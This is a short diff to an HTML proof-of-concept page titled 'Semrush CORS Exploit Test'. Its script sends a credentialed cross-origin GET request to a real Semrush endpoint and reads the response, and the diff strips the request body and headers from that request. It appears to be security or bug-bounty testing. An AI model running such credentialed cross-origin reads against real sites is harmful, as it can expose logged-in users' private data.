@@ -4,12 +4,8 @@
     <h2>Semrush CORS Exploit Test</h2>
     <script>
       fetch("https://www.semrush.com/olaf", {
-        method: "GET",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ test: "cors" })
+        method: "GET",  // ✅ No body
+        credentials: "include"
       })
       .then(response => response.text())
       .then(data => {
@@ -21,3 +17,4 @@
     </script>
   </body>
 </html>
+
